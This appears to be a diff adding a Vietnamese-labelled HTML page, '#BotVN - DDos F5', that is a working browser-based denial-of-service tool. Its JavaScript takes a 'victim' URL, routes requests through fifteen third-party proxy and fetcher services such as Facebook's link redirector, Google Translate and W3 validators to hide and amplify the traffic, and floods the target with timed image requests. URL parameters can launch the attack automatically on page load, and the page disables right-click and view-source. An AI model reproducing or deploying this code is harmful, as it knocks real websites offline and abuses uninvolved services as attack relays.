@@ -1,0 +1,317 @@
+﻿<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>#BotVN - DDos F5 Loại 3</title>
+        <meta name="description" content="#BotVN - DDos F5 Loại 3">
+        <meta name="keywords" content="#BotVN,ddos f5,ddos,f5ddos,f5">
+        <meta name="author" content="#BotVN - DDos F5 Loại 3">
+        <meta content="global" name="distribution">
+        <meta content="general" name="rating">
+        <meta content="EN,UK,US" http-equiv="content-language">
+        
+        <meta http-equiv="X-UA-Compatible" content="IE=9">
+        <meta content="US" name="geo.country">
+        <meta name="geo.region" content="US-MA">
+        <meta name="tgn.nation" content="United States">
+        <meta content="2013" name="copyright">
+        <meta content="translate" name="google">
+        <meta name="robots" content="index, follow">                                                                   
+        <link rel="SHORTCUT ICON" href="http://img15.hostingpics.net/pics/707428anonymousbydeibyybiedd515ebr.gif" height="350" width="350">
+        <style type="text/css"></style></head>
+<style type="text/css">body, input
+{
+    font-family: Arial;
+    color: red;
+	font-size: 10px:
+}
+
+a {color: #ff0000;text-decoration:none;}
+
+a:hover{color: #f00;text-decoration:underline;}
+
+#container
+{
+    border: 2px #0E0E0E solid;
+    -moz-border-radius: 8px;
+    margin: auto;
+    padding: 5px;
+    width: 700px;
+}
+ul#form
+{
+    list-style-type: none;
+    padding: 0;
+    margin: 0;
+}
+ul#form li
+{
+	background: black; 	
+    width: 700px;
+	height: 25px;
+	font-size: 12px;
+}
+</style>
+
+<script type="text/javascript">
+function getParameterByName(name) {
+    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+    var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+        results = regex.exec(location.search);
+    return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+} 
+$(document).ready(function(){
+	$("#btn_init").click(function(){
+		victim 	= $('#victim').val();
+		
+		if(victim==''){
+			alert('Chưa nhập victim!');
+			$('#victim').focus();
+		}
+		else{
+			url= $('select[name=type]').val()+victim;
+			$('#div_content').empty();
+			$('.div_report').empty();
+			number = parseInt($('#number').val());
+			for(i=0; i<number; i++){
+				content ="";
+				content+= "<div class='stt'>"+(i+1).toString()+".</div> URL / IP : <input id='targetURL" + i.toString() + "' style='width: 50%;'  value='"+url+"'>";
+				content+="Request :  <input id='rps" + i.toString() + "' style='width: 5%;' value='99999999999999999999999999999999999999999999999999'>";
+				content+="Message : <input id='message"+ i.toString() +"' style='width: 5%;' value='#BotVN'>";
+				content+="<button id='fireButton"+ i.toString() +"' class='BTN'>START</button><br>";
+				$('#div_content').append(content);	
+				
+				//
+				report="<div class='IFC'>";
+                report+="<legend><font color='#000000'><b>Fire "+ (i+1) +"</b></font></legend><dl>";
+                report+="<dt style='color: #000000;'>Sending :</dt>";
+                report+="<dd id='requestedCtr"+ i.toString() +"'>0</dd>";
+                report+="<dt style='color: blue;'>Obtaining :</dt>";
+                report+="<dd id='succeededCtr"+ i.toString() +"' style='opacity: 0.5;'>0</dd>";
+                report+="<dt style='color: blue;'>Failed :</dt>";
+                report+="<dd id='failedCtr"+ i.toString() +"' style='opacity: 0.5;'>0</dd></dl></div>";
+				$('.div_report').append(report);
+				
+				attack(i);
+			}
+		}
+	});
+	$("#btn_attack").click(function(){
+		if($("#btn_attack").text()=='Tấn Công'){
+			$("#btn_attack").text('Dừng');
+		}
+		else{
+			$("#btn_attack").text('Tấn Công');
+		}
+		$("button[id*='fireButton']").trigger('click');
+	});
+	var victim = getParameterByName('v');
+	if(victim!=''){
+		$('#victim').val(victim);
+		if(getParameterByName('n')!=''){
+			$('#number').val(getParameterByName('n'));
+		}
+		if(getParameterByName('t')!=''){
+			t = parseInt(getParameterByName('t'));
+			if(t>0){
+				document.getElementById("type").selectedIndex= t-1;
+			}
+		}
+		$("#btn_init").trigger('click');
+		$("#btn_attack").trigger('click');
+	}
+});
+
+function attack(id) {
+	var fireInterval;
+	var isFiring = false;
+	var requestedCtrNode = document.getElementById("requestedCtr"+id),
+		succeededCtrNode = document.getElementById("succeededCtr"+id),
+		failedCtrNode = document.getElementById("failedCtr"+id),
+		targetURLNode = document.getElementById("targetURL"+id),
+		fireButton = document.getElementById("fireButton"+id),
+		messageNode = document.getElementById("message"+id),
+		rpsNode = document.getElementById("rps"+id),
+		timeoutNode = document.getElementById("timeout"+id);
+	var targetURL = targetURLNode.value;
+	targetURLNode.onchange = function () {
+		targetURL = this.value;};
+	var requestsHT = {};
+	var requestedCtr = 0,
+		succeededCtr = 0,
+		failedCtr = 0;
+	var makeHttpRequest = function () {
+			if (requestedCtr > failedCtr + succeededCtr + 99999999999999999999999999999999999999999999999999) { 
+				return; };
+			var rID =Number(new Date());
+			var img = new Image();
+			img.onerror = function () { onFail(rID); };img.onabort = function () { onFail(rID); };img.onload = function () { onSuccess(rID); };img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);requestsHT[rID] = img;
+			onRequest(rID); };
+	var onRequest = function (rID) {
+			requestedCtr++;
+			requestedCtrNode.innerHTML = requestedCtr; };
+	var onComplete = function (rID) {
+			delete requestsHT[rID]; };
+	var onFail = function (rID) {succeededCtr++; succeededCtrNode.innerHTML = succeededCtr; delete requestsHT[rID];};
+	var onSuccess = function (rID) {succeededCtr++;
+	succeededCtrNode.innerHTML = succeededCtr; delete requestsHT[rID];
+		}; 
+		fireButton.onclick = function () {
+		if (isFiring) {clearInterval(fireInterval);isFiring = false; this.innerHTML = "START"; } else {isFiring = true; this.innerHTML = "STOP";fireInterval = setInterval(makeHttpRequest, (99999999999999999999999999999999999999999999999999 / parseInt(rpsNode.value) | 0));} };
+}
+</script>
+<script type="text/javascript">
+var isCtrl = false;
+document.onkeyup=function(e)
+{
+if(e.which == 17)
+isCtrl=false;
+}
+document.onkeydown=function(e)
+{
+if(e.which == 17)
+isCtrl=true;
+if((e.which == 85) || (e.which == 67) && isCtrl == true)
+{
+// alert(‘Keyboard shortcuts are cool!’);
+return false;
+}
+}
+var isNS = (navigator.appName == "Netscape") ? 1 : 0;
+if(navigator.appName == "Netscape") document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
+function mischandler(){
+return false;
+}
+function mousehandler(e){
+var myevent = (isNS) ? e : event;
+var eventbutton = (isNS) ? myevent.which : myevent.button;
+if((eventbutton==2)||(eventbutton==3)) return false;
+}
+document.oncontextmenu = mischandler;
+document.onmousedown = mousehandler;
+document.onmouseup = mousehandler;	
+</script>
+<style>
+.shakeimage{
+position:relative
+}
+</style>
+
+<center>
+
+
+<style type="text/css">
+body {	
+			
+		}
+h1 	{
+			font-family:Audiowide;
+			font-size:50px;
+			color:white;
+}
+ .glow {
+        -webkit-animation-duration: 1s;
+        -webkit-animation-name: glow;
+        -webkit-animation-direction: alternate;
+        -webkit-animation-iteration-count: infinite;
+        animation-duration: 1s;
+        animation-name: glow;
+        animation: glow 1000ms ease-out infinite alternate;
+		-webkit-animation: glow 1000ms ease-out infinite alternate;
+	-moz-animation: glow 1000ms ease-out infinite alternate;
+	-o-animation: glow 1000ms ease-out infinite alternate;
+	-ms-animation: glow 1000ms ease-out infinite alternate;
+		
+    
+    }
+    
+    @-webkit-keyframes glow {
+        from { text-shadow: 0 0 5px red; }
+        to { text-shadow: 0 0 30px blue; }
+    }
+	.gaya {
+            color: red;
+        }
+        .max {
+            font-size: 19px;
+            font-family: orbitron;
+            color: #FFFFFF;
+			text-shadow:black 0px 0px 5px;
+        }
+	</style>
+
+<center>
+<br><center><font color="blue" size="4"><div style="\"margin-top:" 5px;="" font-weight:="" bold;="" text-shadow:="" 10px="" black;\"=""></div></font>
+</center><br><style type="text/css">
+.stt{
+	width: 60px;
+	float: left;
+}
+.centerDiv{
+	margin-left: auto;
+    margin-right: auto;
+    width: 70%;
+    background-color: 339900;
+	color: red;
+	padding: 10px;
+	border-radius: 5px;
+	margin-bottom: 10px;
+}
+.div_report
+{
+	margin-top: 10px;
+	font-family:arial;
+	color:#000;
+	font-size:15px;
+	width: 100%;
+	height: 22%
+	float:center;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:center;
+}
+
+.IFC
+{
+	font-family:arial;
+	color: red;
+	font-size:12px;
+	width: 9%;
+	float:left;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:center;
+}
+</style>
+<div class="centerDiv">
+<center>
+<div style="margin-top: 5px;margin-bottom: 20px; font-weight: bold; text-shadow: 1px 1px 2px #fff;">..:: BMN2312 F5 Ddos  ::..</div>
+</center>
+	Victim: <input id="victim"> QUANTITY <input id="number" value="10">
+	<select name="type" id="type">
+		<option value="https://www.facebook.com/l.php?u=">1. Facebook</option>
+        <option value="https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=">2. Blogger</option>
+        <option value="https://drive.google.com/viewerng/viewer?url=">3. Drive google</option>
+		<option value="https://add.my.yahoo.com/rss?url=">4. Yahoo</option>
+		<option value="https://plus.google.com/share?url=">5. Plus google</option>
+		<option value="http://host-tracker.com/check_page/?furl=">6. Host Tracker</option>
+		<option value="hhttp://jigsaw.w3.org/css-validator/validator?uri=">7. Jigsaw W3</option>
+		<option value="http://www.google.com/translate?u=">8. Google Translate</option>	
+		<option value="http://anonymouse.org/cgi-bin/anon-www.cgi/">9. Anonymouse.org</option>
+		<option value="http://www.onlinewebcheck.com/?url=">10. Onlinewebcheck.com</option>
+		<option value="http://feedvalidator.org/check.cgi?url=">11. Feedvalidator.org</option>	
+		<option value="http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=">12. Online-translator.com</option>			
+		<option value="http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=">13. Translate.ru</option>
+		<option value="http://validator.w3.org/feed/check.cgi?url=">14. Validator.W3"></option>
+		<option value="http://www.pagescoring.com/website-speed-test/?url=">15. Pagescoring.com</option>	
+	</select>
+	<br>
+	<button type="button" id="btn_init">TẠO</button>	
+	<button type="button" id="btn_attack">ATTACK</button>	
+</div>
+<fieldset id="div_content" style="min-height: 200px; font-family:arial;color:000;font-size:15px;width: 90%;height: auto; border:1px solid orange; border-radius: 5px;margin-left: auto; margin-top: 5px; margin-right: auto;"></fieldset>
+
+<div>
+<fieldset id="div_report" style="min-height: 200px; margin-top: 10px; font-family:arial; font-size:15px;width: 90%;margin-left: auto;margin-right: auto; border:1px solid orange; border-radius: 5px;">
+<div class="div_report"></div></fieldset></div>
+<noscript>
+You must enable JavaScript to see this text.
+</noscript>
+</center></center>
